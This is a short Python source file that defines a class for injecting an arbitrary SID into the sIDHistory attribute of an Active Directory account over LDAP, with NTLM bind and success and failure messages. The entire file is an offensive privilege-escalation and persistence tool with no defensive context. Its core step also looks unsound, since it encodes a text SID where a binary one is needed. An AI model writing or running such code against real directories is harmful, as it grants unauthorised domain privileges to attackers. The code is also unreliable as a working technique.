import ldap3

class SIDHistoryInjector:
    def __init__(self, config, verbose=False):
        self.config = config
        self.verbose = verbose

    def inject(self):
        server = ldap3.Server(self.config["ldap_server"], get_info=ldap3.ALL)
        conn = ldap3.Connection(
            server,
            user=self.config["bind_dn"],
            password=self.config["password"],
            authentication=ldap3.NTLM,
            auto_bind=True
        )

        target_dn = self.config["target_dn"]
        sid_to_inject = self.config["sid"]

        if self.verbose:
            print(f"[INFO] Injecting SID {sid_to_inject} into SIDHistory of {target_dn}")

        conn.modify(
            dn=target_dn,
            changes={"sIDHistory": [(ldap3.MODIFY_ADD, [sid_to_inject.encode()])]}
        )

        if conn.result["description"] == "success":
            print("[+] SIDHistory injection successful")
        else:
            print(f"[-] Injection failed: {conn.result}")
        conn.unbind()
